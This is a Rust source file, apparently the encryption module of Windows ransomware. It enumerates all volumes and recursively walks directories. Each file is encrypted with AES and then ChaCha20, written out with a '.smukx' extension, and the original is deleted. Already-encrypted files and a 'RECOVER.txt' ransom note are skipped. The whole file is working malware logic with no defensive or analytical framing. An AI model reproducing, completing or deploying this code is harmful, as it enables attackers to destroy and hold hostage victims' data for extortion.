use std::ffi::OsString;
use std::fs::{self, File};
use std::io::{Read, Write};
use std::path::{Path, PathBuf};
use winapi::um::errhandlingapi::GetLastError;
use winapi::um::fileapi::{FindFirstVolumeW, FindNextVolumeW, FindVolumeClose};
use std::os::windows::ffi::OsStringExt;

use winapi::ctypes::c_void;
use winapi::shared::minwindef::MAX_PATH;

use crate::encrypt::{
    encrypt_aes, encrypt_chacha
};

// 

pub fn recursive_encrypt(dir: &Path, key: &[u8; 32], chacha_key: &[u8; 32], chacha_nonce: &[u8; 12]) {
    if dir.is_dir() {
        match fs::read_dir(dir) {
            Ok(entries) => {
                for entry in entries {
                    match entry {
                        Ok(entry) => {
                            let path = entry.path();
                            if path.is_dir() {
                                recursive_encrypt(&path, key, chacha_key, chacha_nonce);
                            } else {
                                encrypt_file(&path, key, chacha_key, chacha_nonce);
                            }
                        }
                        Err(e) => eprintln!("Failed to read entry: {}", e),
                    }
                }
            }
            Err(e) => eprintln!("Failed to read directory '{}': {}", dir.display(), e),
        }
    }
}

fn encrypt_file(file_path: &Path, key: &[u8; 32], chacha_key: &[u8; 32], chacha_nonce: &[u8; 12]) {
    if file_path.extension().and_then(|ext| ext.to_str()) == Some("smukx") {
        return;
    }

    if file_path.file_name().map_or(false, |name| name == "RECOVER.txt"){
        return;
    }
    
    let mut contents = Vec::new();
    
    // Handle file open errors
    if let Ok(mut file) = File::open(file_path) {
        if let Err(e) = file.read_to_end(&mut contents) {
            eprintln!("Failed to read file '{}': {}", file_path.display(), e);
            return;
        }
    } else {
        eprintln!("File not found or unable to open: '{}'", file_path.display());
        return;
    }

    let encrypted_aes = encrypt_aes(&contents, key);
    let encrypted_chacha = encrypt_chacha(&encrypted_aes, chacha_key, chacha_nonce);

    let mut new_file_path = PathBuf::from(file_path);
    let new_ext = format!(
        "{}.smukx",
        file_path.extension().and_then(|ext| ext.to_str()).unwrap_or("")
    );
    new_file_path.set_extension(new_ext);

    if let Ok(mut enc_file) = File::create(&new_file_path) {
        if let Err(e) = enc_file.write_all(&encrypted_chacha) {
            eprintln!("Failed to write to file '{}': {}", new_file_path.display(), e);
            return;
        }
    } else {
        eprintln!("Unable to create file '{}'", new_file_path.display());
        return;
    }

    if let Err(e) = fs::remove_file(file_path) {
        eprintln!("Failed to delete the original file '{}': {}", file_path.display(), e);
    }
}


pub(crate) fn get_all_volumes() -> Vec<OsString> {
    let mut volumes = Vec::new();
    let mut volume_name: [u16; MAX_PATH] = [0; MAX_PATH];
    let volume_handle: *mut c_void;

    unsafe {
        volume_handle = FindFirstVolumeW(volume_name.as_mut_ptr(), MAX_PATH as u32);

        if volume_handle != std::ptr::null_mut() {
            loop {
                let name_length = volume_name.iter().position(|&c| c == 0).unwrap_or(MAX_PATH);
                let volume = OsString::from_wide(&volume_name[..name_length]);
                volumes.push(volume);

                if FindNextVolumeW(volume_handle, volume_name.as_mut_ptr(), MAX_PATH as u32) == 0 {
                    if GetLastError() == 18 { // ERROR_NO_MORE_FILES
                        break;
                    }
                }
            }
            FindVolumeClose(volume_handle);
        }
    }

    volumes
}    
